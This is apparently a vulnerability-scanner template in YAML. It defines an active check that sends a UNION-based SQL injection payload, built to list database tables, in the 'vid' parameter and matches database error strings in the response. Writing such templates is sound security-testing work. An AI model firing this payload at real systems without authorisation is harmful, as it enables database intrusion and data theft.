id: sqli7-131
name: 'UNION probe in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - '1'' UNION SELECT table_name FROM information_schema.tables--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
